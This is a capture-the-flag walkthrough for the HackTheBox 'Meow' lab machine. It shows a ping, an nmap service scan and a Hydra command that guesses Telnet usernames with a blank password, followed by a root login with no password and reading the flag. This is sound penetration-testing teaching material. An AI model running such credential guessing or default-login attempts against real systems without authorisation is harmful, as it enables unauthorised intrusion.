# Meow

The first machine in the HTB Starting Point path. This machine introduces basic service enumeration and Telnet access.

## Verify connectivity to the target

Send an ICMP echo request to confirm that the target is reachable.

Command:

```bash
ping <target_ip>
```

## Find open ports and services running on the target IP

Perform a service scan to identify open ports and running services.

Command:

```bash
nmap -Pn -sV <target_ip>
```

Expected result:

* Port 23: Telnet

## Identify potential usernames

When a service allows authentication, common usernames such as `admin`, `root`, or `administrator` should be tested first.

One way to enumerate usernames is with Hydra:

```bash
hydra -L <wordlist_path> -p "" telnet://<target_ip>
```

The scan reveals that the username `root` is accepted.

## Connect to the Telnet service

Connect to the target using Telnet.

Command:

```bash
telnet <target_ip>
```

Login using:

```text
Username: root
Password: (leave blank)
```

## Obtain the flag

After successful authentication, list the files in the current directory:

```bash
ls
```

Read the flag:

```bash
cat flag.txt
```

The flag is successfully obtained.

## Key Takeaway

Enumeration is the most important phase of penetration testing. Identifying exposed services and testing common credentials can often lead directly to initial access, especially on misconfigured systems.
